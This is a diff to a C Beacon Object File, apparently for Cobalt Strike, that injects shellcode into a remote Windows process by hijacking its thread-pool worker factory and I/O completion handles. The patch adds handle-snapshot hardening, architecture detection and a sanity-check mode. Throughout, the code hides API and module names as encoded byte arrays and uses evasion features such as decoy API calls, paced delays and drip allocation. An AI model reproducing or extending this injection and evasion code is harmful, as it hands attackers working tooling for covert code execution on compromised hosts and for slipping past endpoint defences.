+static const unsigned char kApiRtlGetVersion[] = { 0xF5, 0x48, 0xFD, 0x19, 0x4E, 0xA0, 0x3E, 0x94, 0xD5, 0x4F, 0xF8, 0x31, 0x45 };
+// "RtlGetVersion"
+static const unsigned char kModKernel32[] = { 0xCC, 0x59, 0xE3, 0x30, 0x4E, 0xB8, 0x5B, 0xC3, 0x89, 0x58, 0xFD, 0x32 };
+// "kernel32.dll"
 
 static void ObfWipe(char *dst, int n) {
     int i;
@@ -1018,12 +1113,9 @@ static void ApiPauseDecoy(int round, volatile DWORD *acc) {
     LARGE_INTEGER pc;
     SYSTEM_INFO si;
     SYSTEMTIME st;
-    int which;
+    unsigned int which;
 
-    which = (round + MSVCRT$rand() + (int)(*acc)) % 8;
-    if (which < 0) {
-        which = 0;
-    }
+    which = ((unsigned int)round + (unsigned int)MSVCRT$rand() + (unsigned int)(*acc)) % 8u;
     switch (which) {
     case 0:
         *acc ^= KERNEL32$GetTickCount();
@@ -1162,13 +1254,278 @@ static void FreeShellcodeRemote(void) {
     }
 }
 
+static void MarkPublished(void) {
+    m_bShellcodePublished = TRUE;
+}
+
+static void FreeShellcodeIfUnpublished(void) {
+    if (!m_bShellcodePublished) {
+        FreeShellcodeRemote();
+    }
+}
+
+static void ResetSharedState(void) {
+    m_p_hTargetPid = NULL;
+    m_dwTargetPid = 0;
+    m_ShellcodeAddress = NULL;
+    m_cShellcode = NULL;
+    m_szShellcodeSize = 0;
+    m_dwApiDelayMs = 0;
+    m_bDripAlloc = FALSE;
+    m_dwDripDelayMs = 0;
+    m_bSanityOnly = FALSE;
+    m_bShellcodePublished = FALSE;
+    m_dwWfTypeIndex = 0;
+}
+
+static void WaitMs(DWORD ms) {
+    DWORD start;
+
+    if (ms == 0) {
+        return;
+    }
+    start = KERNEL32$GetTickCount();
+    while ((KERNEL32$GetTickCount() - start) < ms) {
+        KERNEL32$SwitchToThread();
+    }
+}
+
+static BOOL SnapshotAccessOk(ACCESS_MASK granted, DWORD desired) {
+    if ((granted & GENERIC_ALL) == GENERIC_ALL) {
+        return TRUE;
+    }
+    return ((granted & desired) == desired) ? TRUE : FALSE;
+}
+
+static BOOL UnicodeNameEquals(PUNICODE_STRING us, const wchar_t *want, int wantChars) {
+    int i;
+    int n;
+
+    if (us == NULL || us->Buffer == NULL || want == NULL || wantChars <= 0) {
+        return FALSE;
+    }
+    n = (int)(us->Length / sizeof(WCHAR));
+    if (n != wantChars) {
+        return FALSE;
+    }
+    for (i = 0; i < n; i++) {
+        if (us->Buffer[i] != want[i]) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static int WideEncChars(const unsigned char *enc, int n) {
+    wchar_t tmp[64];
+    int nChars;
+
+    if (enc == NULL || n <= 0 || n > (int)sizeof(tmp)) {
+        return 0;
+    }
+    MSVCRT$memset(tmp, 0, sizeof(tmp));
+    ObfDecBytes((unsigned char *)tmp, enc, n);
+    nChars = (int)(n / (int)sizeof(wchar_t));
+    if (nChars > 0 && tmp[nChars - 1] == L'\0') {
+        nChars--;
+    }
+    MSVCRT$memset(tmp, 0, sizeof(tmp));
+    return nChars;
+}
+
+static BOOL LocalObjectFits(LPCVOID p, SIZE_T need) {
+    MEMORY_BASIC_INFORMATION mbi;
+    ULONG_PTR start;
+    ULONG_PTR end;
+    ULONG_PTR regionEnd;
+
+    if (p == NULL || need == 0) {
+        return FALSE;
+    }
+    MSVCRT$memset(&mbi, 0, sizeof(mbi));
+    if (KERNEL32$VirtualQuery(p, &mbi, sizeof(mbi)) == 0) {
+        return FALSE;
+    }
+    if (mbi.State != MEM_COMMIT) {
+        return FALSE;
+    }
+    start = (ULONG_PTR)p;
+    end = start + need;
+    if (end < start) {
+        return FALSE;
+    }
+    regionEnd = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
+    if (start < (ULONG_PTR)mbi.BaseAddress || end > regionEnd) {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static void SanitizeTpDirect(PTP_DIRECT d) {
+    if (d == NULL) {
+        return;
+    }
+    d->Task.ListEntry.Flink = NULL;
+    d->Task.ListEntry.Blink = NULL;
+    d->IoCompletionInformationList.Flink = NULL;
+    d->IoCompletionInformationList.Blink = NULL;
+}
+
+static void SanitizeCleanupGroupMember(PTPP_CLEANUP_GROUP_MEMBER m) {
+    if (m == NULL) {
+        return;
+    }
+    m->CleanupGroup = NULL;
+    m->CleanupGroupCancelCallback = NULL;
+    m->FinalizationCallback = NULL;
+    m->CleanupGroupMemberLinks.Flink = NULL;
+    m->CleanupGroupMemberLinks.Blink = NULL;
+    m->Context = NULL;
+    m->ActivationContext = NULL;
+    m->SubProcessTag = NULL;
+    m->RaceDll = NULL;
+    m->Pool = NULL;
+    m->PoolObjectLinks.Flink = NULL;
+    m->PoolObjectLinks.Blink = NULL;
+}
+
+#ifdef PP_NEED_TP_IO
+static VOID CALLBACK DummyIoCallback(
+    PTP_CALLBACK_INSTANCE Instance,
+    PVOID Context,
+    PVOID Overlapped,
+    ULONG IoResult,
+    ULONG_PTR NumberOfBytesTransferred,
+    PTP_IO Io)
+{
+    (void)Instance;
+    (void)Context;
+    (void)Overlapped;
+    (void)IoResult;
+    (void)NumberOfBytesTransferred;
+    (void)Io;
+}
+#endif
+
+#ifdef PP_NEED_ALPC
+static VOID NTAPI DummyAlpcCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_ALPC Alpc) {
+    (void)Instance;
+    (void)Context;
+    (void)Alpc;
+}
+#endif
+
+#ifdef PP_NEED_JOB
+static VOID NTAPI DummyJobCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PVOID Job) {
+    (void)Instance;
+    (void)Context;
+    (void)Job;
+}
+#endif
+
+#ifdef PP_HIJACK_TIMER
+static VOID CALLBACK DummyTimerCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer) {
+    (void)Instance;
+    (void)Context;
+    (void)Timer;
+}
+#endif
+
+static BOOL CopyLocalTpObject(void *dst, const void *src, SIZE_T n) {
+    if (dst == NULL || src == NULL || n == 0) {
+        return FALSE;
+    }
+    if (!LocalObjectFits(src, n)) {
+        OBF_PRINT0(CALLBACK_ERROR, kFmtCopyGuard);
+        return FALSE;
+    }
+    MSVCRT$memcpy(dst, src, n);
+    return TRUE;
+}
+
+static BOOL PlausibleUserPtr(PVOID p, BOOL nullOk) {
+    ULONG_PTR v;
+
+    v = (ULONG_PTR)p;
+    if (v == 0) {
+        return nullOk;
+    }
+    if (v < 0x10000ull) {
+        return FALSE;
+    }
+    if ((v & 7ull) != 0) {
+        return FALSE;
+    }
+    if (v > 0x00007FFFFFFEFFFFull) {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static BOOL HostIsWin81OrNewer(void) {
+    OSVERSIONINFOW vi;
+    _RtlGetVersion RtlGetVersion;
+
+    RtlGetVersion = (_RtlGetVersion)ResolveNtdllEnc(kApiRtlGetVersion, (int)sizeof(kApiRtlGetVersion));
+    if (RtlGetVersion == NULL) {
+        return FALSE;
+    }
+    MSVCRT$memset(&vi, 0, sizeof(vi));
+    vi.dwOSVersionInfoSize = sizeof(vi);
+    if (!NT_SUCCESS(RtlGetVersion(&vi))) {
+        return FALSE;
+    }
+    if (vi.dwMajorVersion > 6) {
+        return TRUE;
+    }
+    if (vi.dwMajorVersion == 6 && vi.dwMinorVersion >= 3) {
+        return TRUE;
+    }
+    return FALSE;
+}
+
+static BOOL GrowInfoBuffer(BYTE **pp, ULONG *pLen, ULONG needed) {
+    BYTE *ninfo;
+    ULONG next;
+
+    if (pp == NULL || pLen == NULL) {
+        return FALSE;
+    }
+    next = *pLen;
+    if (needed > next) {
+        next = needed;
+    } else {
+        if (next > (0xFFFFFFFFu / 2u)) {
+            return FALSE;
+        }
+        next *= 2u;
+    }
+    if (next < needed) {
+        return FALSE;
+    }
+    if (next > PP_INFO_MAX) {
+        next = PP_INFO_MAX;
+        if (needed > next) {
+            return FALSE;
+        }
+    }
+    ninfo = (BYTE *)BofRealloc(*pp, next);
+    if (ninfo == NULL) {
+        return FALSE;
+    }
+    *pp = ninfo;
+    *pLen = next;
+    return TRUE;
+}
+
 BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
     _NtQueryObject NtQueryObject;
     ULONG InformationLength;
     ULONG ReturnLength;
+    ULONG needed;
+    int retries;
     NTSTATUS Ntstatus;
     BYTE* Information;
-    BYTE* NewInfo;
 
     if (x == NULL) {
         return NULL;
@@ -1186,24 +1543,31 @@ BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
         return NULL;
     }
 
+    retries = 0;
     while (1) {
+        if (retries >= PP_INFO_RETRIES) {
+            BofFree(Information);
+            return NULL;
+        }
+        retries++;
         Ntstatus = NtQueryObject(x, y, Information, InformationLength, &ReturnLength);
         if (Ntstatus != STATUS_INFO_LENGTH_MISMATCH &&
             Ntstatus != STATUS_BUFFER_OVERFLOW &&
             Ntstatus != STATUS_BUFFER_TOO_SMALL) {
             break;
         }
-        if (ReturnLength <= InformationLength) {
-            InformationLength *= 2;
-        } else {
-            InformationLength = ReturnLength;
+        needed = ReturnLength;
+        if (needed <= InformationLength) {
+            if (InformationLength > (0xFFFFFFFFu / 2u)) {
+                BofFree(Information);
+                return NULL;
+            }
+            needed = InformationLength * 2u;
         }
-        NewInfo = (BYTE*)BofRealloc(Information, InformationLength);
-        if (NewInfo == NULL) {
+        if (!GrowInfoBuffer(&Information, &InformationLength, needed)) {
             BofFree(Information);
             return NULL;
         }
-        Information = NewInfo;
     }
 
     if (!NT_SUCCESS(Ntstatus)) {
@@ -1213,14 +1577,18 @@ BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
     return Information;
 }
 
-static BYTE *QueryHandleSnapshot(HANDLE hProc) {
+static BYTE *QueryHandleSnapshotEx(HANDLE hProc, ULONG *pLen) {
     _NtQueryInformationProcess NtQueryInformationProcess;
     BYTE* Information;
     ULONG InformationLength;
     ULONG ReturnLength;
+    ULONG needed;
+    int retries;
     NTSTATUS Ntstatus;
-    BYTE* NewInfo;
 
+    if (pLen != NULL) {
+        *pLen = 0;
+    }
     if (hProc == NULL) {
         return NULL;
     }
@@ -1242,12 +1610,24 @@ static BYTE *QueryHandleSnapshot(HANDLE hProc) {
     }
 
     InformationLength = ReturnLength + 0x1000;
+    if (InformationLength < ReturnLength || InformationLength > PP_INFO_MAX) {
+        InformationLength = (ReturnLength > PP_INFO_MAX) ? PP_INFO_MAX : ReturnLength;
+        if (InformationLength == 0) {
+            return NULL;
+        }
+    }
     Information = (BYTE*)BofAlloc(InformationLength);
     if (Information == NULL) {
         return NULL;
     }
 
+    retries = 0;
     while (1) {
+        if (retries >= PP_INFO_RETRIES) {
+            BofFree(Information);
+            return NULL;
+        }
+        retries++;
         Ntstatus = NtQueryInformationProcess(
             hProc,
             (PROCESSINFOCLASS)ProcessHandleInformation,
@@ -1259,42 +1639,75 @@ static BYTE *QueryHandleSnapshot(HANDLE hProc) {
             Ntstatus != STATUS_BUFFER_TOO_SMALL) {
             break;
         }
-        if (ReturnLength <= InformationLength) {
-            InformationLength += 0x1000;
+        needed = ReturnLength;
+        if (needed <= InformationLength) {
+            if (InformationLength > (0xFFFFFFFFu - 0x1000u)) {
+                BofFree(Information);
+                return NULL;
+            }
+            needed = InformationLength + 0x1000u;
         } else {
-            InformationLength = ReturnLength + 0x1000;
+            if (needed > (0xFFFFFFFFu - 0x1000u)) {
+                BofFree(Information);
+                return NULL;
+            }
+            needed += 0x1000u;
         }
-        NewInfo = (BYTE*)BofRealloc(Information, InformationLength);
-        if (NewInfo == NULL) {
+        if (!GrowInfoBuffer(&Information, &InformationLength, needed)) {
             BofFree(Information);
             return NULL;
         }
-        Information = NewInfo;
     }
 
     if (!NT_SUCCESS(Ntstatus) || Information == NULL) {
         BofFree(Information);
         return NULL;
     }
+    if (pLen != NULL) {
+        *pLen = InformationLength;
+    }
     return Information;
+}
+
+static BYTE *QueryHandleSnapshot(HANDLE hProc) {
+    return QueryHandleSnapshotEx(hProc, NULL);
+}
+
+static ULONG_PTR SnapshotHandleCount(BYTE *Information, ULONG infoLen) {
+    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
+    ULONG_PTR cap;
+
+    if (Information == NULL || infoLen < sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION)) {
+        return 0;
+    }
+    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
+    cap = (infoLen - offsetof(PROCESS_HANDLE_SNAPSHOT_INFORMATION, Handles)) / sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO);
+    if (snap->NumberOfHandles < cap) {
+        return snap->NumberOfHandles;
+    }
+    return cap;
 }
 
 static ULONG TypeIndexFromLocalHandle(HANDLE h) {
     BYTE *Information;
     PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
     ULONG_PTR i;
+    ULONG_PTR n;
     ULONG idx;
+    ULONG infoLen;
 
     if (h == NULL || h == INVALID_HANDLE_VALUE) {
         return 0;
     }
-    Information = QueryHandleSnapshot(KERNEL32$GetCurrentProcess());
+    infoLen = 0;
+    Information = QueryHandleSnapshotEx(KERNEL32$GetCurrentProcess(), &infoLen);
     if (Information == NULL) {
         return 0;
     }
     snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
     idx = 0;
-    for (i = 0; i < snap->NumberOfHandles; i++) {
+    n = SnapshotHandleCount(Information, infoLen);
+    for (i = 0; i < n; i++) {
         if (snap->Handles[i].HandleValue == h) {
             idx = snap->Handles[i].ObjectTypeIndex;
             break;
@@ -1339,30 +1752,39 @@ HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesired
     PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation;
     HANDLE found;
     ULONG_PTR i;
+    ULONG_PTR n;
+    ULONG infoLen;
+    int wantChars;
 
     if (wsObjectType == NULL || p_hTarget == NULL) {
         return NULL;
     }
 
-    Information = QueryHandleSnapshot(p_hTarget);
+    infoLen = 0;
+    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
     if (Information == NULL) {
         return NULL;
     }
 
     pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
     found = NULL;
+    wantChars = (int)MSVCRT$wcslen(wsObjectType);
+    n = SnapshotHandleCount(Information, infoLen);
 
-    for (i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
+    for (i = 0; i < n; i++) {
         HANDLE p_hDuplicatedObject = NULL;
         BYTE* pObjectInformation;
         PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;
         ACCESS_MASK granted;
+        ULONG snapType;
+        BOOL nameOk;
 
         granted = pProcessHandleInformation->Handles[i].GrantedAccess;
-        if ((granted & dwDesiredAccess) != dwDesiredAccess) {
+        if (!SnapshotAccessOk(granted, dwDesiredAccess)) {
             continue;
         }
-        if (typeIndex != 0 && pProcessHandleInformation->Handles[i].ObjectTypeIndex != typeIndex) {
+        snapType = pProcessHandleInformation->Handles[i].ObjectTypeIndex;
+        if (typeIndex != 0 && snapType != typeIndex) {
             continue;
         }
 
@@ -1382,6 +1804,23 @@ HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesired
             break;
         }
 
+#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
+        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
+            wchar_t wfName[64];
+            int wfChars;
+
+            MSVCRT$memset(wfName, 0, sizeof(wfName));
+            ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+            wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+            if (wantChars == wfChars && MSVCRT$wcsncmp(wsObjectType, wfName, (size_t)wantChars) == 0) {
+                MSVCRT$memset(wfName, 0, sizeof(wfName));
+                found = p_hDuplicatedObject;
+                break;
+            }
+            MSVCRT$memset(wfName, 0, sizeof(wfName));
+        }
+#endif
+
         pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
         if (pObjectInformation == NULL) {
             KERNEL32$CloseHandle(p_hDuplicatedObject);
@@ -1389,14 +1828,28 @@ HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesired
         }
 
         pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation;
-        if (pObjectTypeInformation->TypeName.Buffer == NULL ||
-            MSVCRT$wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
-            BofFree(pObjectInformation);
+        nameOk = UnicodeNameEquals(&pObjectTypeInformation->TypeName, wsObjectType, wantChars);
+        BofFree(pObjectInformation);
+        if (!nameOk) {
             KERNEL32$CloseHandle(p_hDuplicatedObject);
             continue;
         }
 
-        BofFree(pObjectInformation);
+#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
+        {
+            wchar_t wfName[64];
+            int wfChars;
+
+            MSVCRT$memset(wfName, 0, sizeof(wfName));
+            ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+            wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+            if (wantChars == wfChars && MSVCRT$wcsncmp(wsObjectType, wfName, (size_t)wantChars) == 0 && snapType != 0) {
+                m_dwWfTypeIndex = snapType;
+            }
+            MSVCRT$memset(wfName, 0, sizeof(wfName));
+        }
+#endif
+
         found = p_hDuplicatedObject;
         break;
     }
@@ -1438,6 +1891,30 @@ static BOOL QueryWorkerFactoryBasicInformation(HANDLE hWorkerFactory, PWORKER_FA
     return NT_SUCCESS(Ntstatus);
 }
 
+static BOOL HandleTypeNameIs(HANDLE h, const unsigned char *enc, int n) {
+    BYTE *info;
+    PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
+    wchar_t name[64];
+    int wantChars;
+    BOOL ok;
+
+    if (h == NULL || enc == NULL || n <= 0 || n > (int)sizeof(name)) {
+        return FALSE;
+    }
+    info = NtQueryObject_(h, ObjectTypeInformation);
+    if (info == NULL) {
+        return FALSE;
+    }
+    MSVCRT$memset(name, 0, sizeof(name));
+    ObfDecBytes((unsigned char *)name, enc, n);
+    wantChars = WideEncChars(enc, n);
+    typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)info;
+    ok = UnicodeNameEquals(&typeObj->TypeName, name, wantChars);
+    MSVCRT$memset(name, 0, sizeof(name));
+    BofFree(info);
+    return ok;
+}
+
 static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
     WORKER_FACTORY_BASIC_INFORMATION info;
     HANDLE remoteIocp;
@@ -1469,6 +1946,12 @@ static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
             0)) {
         return NULL;
     }
+    if (m_bSanityOnly) {
+        if (!HandleTypeNameIs(localIocp, kTypeIoCompletion, (int)sizeof(kTypeIoCompletion))) {
+            KERNEL32$CloseHandle(localIocp);
+            return NULL;
+        }
+    }
     return localIocp;
 }
 
@@ -1476,33 +1959,42 @@ static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
     BYTE *Information;
     PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
     ULONG_PTR i;
+    ULONG_PTR n;
+    ULONG infoLen;
     HANDLE found;
     wchar_t wfName[64];
+    int wfChars;
 
     found = NULL;
     if (p_hTarget == NULL) {
         return NULL;
     }
-    Information = QueryHandleSnapshot(p_hTarget);
+    infoLen = 0;
+    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
     if (Information == NULL) {
         return NULL;
     }
 
     MSVCRT$memset(wfName, 0, sizeof(wfName));
     ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+    wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
     snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
+    n = SnapshotHandleCount(Information, infoLen);
 
-    for (i = 0; i < snap->NumberOfHandles; i++) {
+    for (i = 0; i < n; i++) {
         HANDLE hWf;
         HANDLE hIocp;
         BYTE *typeInfo;
         PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
         ACCESS_MASK granted;
+        ULONG snapType;
+        BOOL isWf;
 
         granted = snap->Handles[i].GrantedAccess;
-        if ((granted & WORKER_FACTORY_QUERY_INFORMATION) != WORKER_FACTORY_QUERY_INFORMATION) {
+        if (!SnapshotAccessOk(granted, WORKER_FACTORY_QUERY_INFORMATION)) {
             continue;
         }
+        snapType = snap->Handles[i].ObjectTypeIndex;
 
         hWf = NULL;
         if (!KERNEL32$DuplicateHandle(
@@ -1516,19 +2008,28 @@ static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
             continue;
         }
 
-        typeInfo = NtQueryObject_(hWf, ObjectTypeInformation);
-        if (typeInfo == NULL) {
-            KERNEL32$CloseHandle(hWf);
-            continue;
-        }
-        typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeInfo;
-        if (typeObj->TypeName.Buffer == NULL ||
-            MSVCRT$wcscmp(wfName, typeObj->TypeName.Buffer) != 0) {
+        isWf = FALSE;
+        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
+            isWf = TRUE;
+        } else {
+            typeInfo = NtQueryObject_(hWf, ObjectTypeInformation);
+            if (typeInfo == NULL) {
+                KERNEL32$CloseHandle(hWf);
+                continue;
+            }
+            typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeInfo;
+            if (UnicodeNameEquals(&typeObj->TypeName, wfName, wfChars)) {
+                isWf = TRUE;
+                if (snapType != 0) {
+                    m_dwWfTypeIndex = snapType;
+                }
+            }
             BofFree(typeInfo);
+        }
+        if (!isWf) {
             KERNEL32$CloseHandle(hWf);
             continue;
         }
-        BofFree(typeInfo);
 
         hIocp = DuplicatePoolIoCompletion(hWf);
         KERNEL32$CloseHandle(hWf);
@@ -1544,6 +2045,80 @@ static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
         ApiPause();
     }
     return found;
+}
+#endif
+
+#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
+static ULONG CountWorkerFactories(HANDLE p_hTarget) {
+    BYTE *Information;
+    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
+    ULONG_PTR i;
+    ULONG_PTR n;
+    ULONG infoLen;
+    ULONG count;
+    wchar_t wfName[64];
+    int wfChars;
+
+    count = 0;
+    if (p_hTarget == NULL) {
+        return 0;
+    }
+    infoLen = 0;
+    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
+    if (Information == NULL) {
+        return 0;
+    }
+    MSVCRT$memset(wfName, 0, sizeof(wfName));
+    ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+    wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
+    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
+    n = SnapshotHandleCount(Information, infoLen);
+    for (i = 0; i < n; i++) {
+        HANDLE hWf;
+        BYTE *typeInfo;
+        PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
+        ULONG snapType;
+        BOOL isWf;
+
+        if (!SnapshotAccessOk(snap->Handles[i].GrantedAccess, WORKER_FACTORY_QUERY_INFORMATION)) {
+            continue;
+        }
+        snapType = snap->Handles[i].ObjectTypeIndex;
+        hWf = NULL;
+        if (!KERNEL32$DuplicateHandle(
+                p_hTarget,
+                snap->Handles[i].HandleValue,
+                KERNEL32$GetCurrentProcess(),
+                &hWf,
+                WORKER_FACTORY_QUERY_INFORMATION,
+                FALSE,
+                0)) {
+            continue;
+        }
+        isWf = FALSE;
+        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
+            isWf = TRUE;
+        } else {
+            typeInfo = NtQueryObject_(hWf, ObjectTypeInformation);
+            if (typeInfo != NULL) {
+                typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeInfo;
+                if (UnicodeNameEquals(&typeObj->TypeName, wfName, wfChars)) {
+                    isWf = TRUE;
+                    if (snapType != 0) {
+                        m_dwWfTypeIndex = snapType;
+                    }
+                }
+                BofFree(typeInfo);
+            }
+        }
+        KERNEL32$CloseHandle(hWf);
+        if (isWf) {
+            count++;
+        }
+    }
+    MSVCRT$memset(wfName, 0, sizeof(wfName));
+    BofFree(Information);
+    return count;
 }
 #endif
 
@@ -1662,12 +2237,51 @@ static int DripReserveCommitWrite(void) {
     return 0;
 }
 
-static BOOL TargetIsWow64(HANDLE hProc) {
-    BOOL wow = FALSE;
-    if (!KERNEL32$IsWow64Process(hProc, &wow)) {
-        return FALSE;
+static int QueryTargetArch(HANDLE hProc) {
+    BOOL wow;
+    char k32[16];
+    char api[32];
+    HMODULE hK32;
+    _IsWow64Process2 fn;
+    USHORT processMachine;
+    USHORT nativeMachine;
+
+    if (hProc == NULL) {
+        return PP_ARCH_UNKNOWN;
     }
-    return wow;
+
+    MSVCRT$memset(k32, 0, sizeof(k32));
+    MSVCRT$memset(api, 0, sizeof(api));
+    ObfDec(k32, kModKernel32, (int)sizeof(kModKernel32));
+    ObfDec(api, kApiIsWow64Process2, (int)sizeof(kApiIsWow64Process2));
+    hK32 = KERNEL32$GetModuleHandleA(k32);
+    fn = NULL;
+    if (hK32 != NULL) {
+        fn = (_IsWow64Process2)KERNEL32$GetProcAddress(hK32, api);
+    }
+    ObfWipe(k32, (int)sizeof(k32));
+    ObfWipe(api, (int)sizeof(api));
+    if (fn != NULL) {
+        processMachine = 0;
+        nativeMachine = 0;
+        if (!fn(hProc, &processMachine, &nativeMachine)) {
+            return PP_ARCH_UNKNOWN;
+        }
+        if (nativeMachine == IMAGE_FILE_MACHINE_ARM64 || processMachine == IMAGE_FILE_MACHINE_ARM64) {
+            return PP_ARCH_UNKNOWN + 1;
+        }
+        if (processMachine != IMAGE_FILE_MACHINE_UNKNOWN &&
+            processMachine != IMAGE_FILE_MACHINE_AMD64 &&
+            processMachine != 0) {
+            return PP_ARCH_WOW64;
+        }
+    }
+
+    wow = FALSE;
+    if (!KERNEL32$IsWow64Process(hProc, &wow)) {
+        return PP_ARCH_UNKNOWN;
+    }
+    return wow ? PP_ARCH_WOW64 : PP_ARCH_NATIVE;
 }
 
 static void InjectCleanup(void) {
@@ -1679,17 +2293,33 @@ static BOOL ParseBeaconArgs(char *args, int len) {
     int delaySec;
     int drip;
     int dripMs;
+    int delayIn;
+    int dripMsIn;
 
     BeaconDataParse(&parser, args, len);
     m_dwTargetPid = BeaconDataInt(&parser);
-    delaySec = BeaconDataInt(&parser);
+    if (BeaconDataLength(&parser) == 0) {
+        m_bSanityOnly = TRUE;
+        m_cShellcode = NULL;
+        m_szShellcodeSize = 0;
+        m_dwApiDelayMs = 0;
+        m_bDripAlloc = FALSE;
+        m_dwDripDelayMs = 0;
+        return TRUE;
+    }
+
+    m_bSanityOnly = FALSE;
+    delayIn = BeaconDataInt(&parser);
     drip = BeaconDataInt(&parser);
-    dripMs = BeaconDataInt(&parser);
+    dripMsIn = BeaconDataInt(&parser);
+    delaySec = delayIn;
+    dripMs = dripMsIn;
     if (delaySec < 0) {
         delaySec = 0;
     }
     if (delaySec > API_PACE_MAX_SEC) {
         delaySec = API_PACE_MAX_SEC;
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtClampDelay);
     }
     m_dwApiDelayMs = (DWORD)delaySec * 1000u;
     m_bDripAlloc = (drip != 0) ? TRUE : FALSE;
@@ -1698,6 +2328,9 @@ static BOOL ParseBeaconArgs(char *args, int len) {
     }
     if (dripMs > DRIP_DELAY_MAX_MS) {
         dripMs = DRIP_DELAY_MAX_MS;
+        if (m_bDripAlloc) {
+            OBF_PRINT0(CALLBACK_OUTPUT, kFmtClampDrip);
+        }
     }
     if (!m_bDripAlloc) {
         dripMs = 0;
@@ -1723,13 +2356,106 @@ static BOOL InjectBegin(void) {
         OBF_PRINT0(CALLBACK_ERROR, kFmtCannotOpen);
         return FALSE;
     }
-    OBF_PRINT1(CALLBACK_OUTPUT, kFmtHandle, m_p_hTargetPid);
-    if (TargetIsWow64(m_p_hTargetPid)) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtWow64);
+    OBF_PRINT0(CALLBACK_OUTPUT, kFmtHandle);
+    return TRUE;
+}
+
+#define SANITY_FAIL(errEnc, sugEnc) do { \
+    OBF_PRINT0(CALLBACK_ERROR, kFmtSanityFail); \
+    OBF_PRINT0(CALLBACK_ERROR, errEnc); \
+    OBF_PRINT0(CALLBACK_OUTPUT, sugEnc); \
+} while (0)
+
+static BOOL SanityOpenTarget(void) {
+    int arch;
+
+    if (m_dwTargetPid == KERNEL32$GetCurrentProcessId()) {
+        SANITY_FAIL(kFmtSelfPid, kFmtSuggestPid);
+        return FALSE;
+    }
+    m_p_hTargetPid = KERNEL32$OpenProcess(PP_OPEN_PROCESS_ACCESS, FALSE, m_dwTargetPid);
+    if (m_p_hTargetPid == NULL) {
+        SANITY_FAIL(kFmtCannotOpen, kFmtSuggestPid);
+        return FALSE;
+    }
+    if (KERNEL32$WaitForSingleObject(m_p_hTargetPid, 0) == WAIT_OBJECT_0) {
+        SANITY_FAIL(kFmtDeadPid, kFmtSuggestPid);
+        InjectCleanup();
+        return FALSE;
+    }
+    arch = QueryTargetArch(m_p_hTargetPid);
+    if (arch == PP_ARCH_UNKNOWN) {
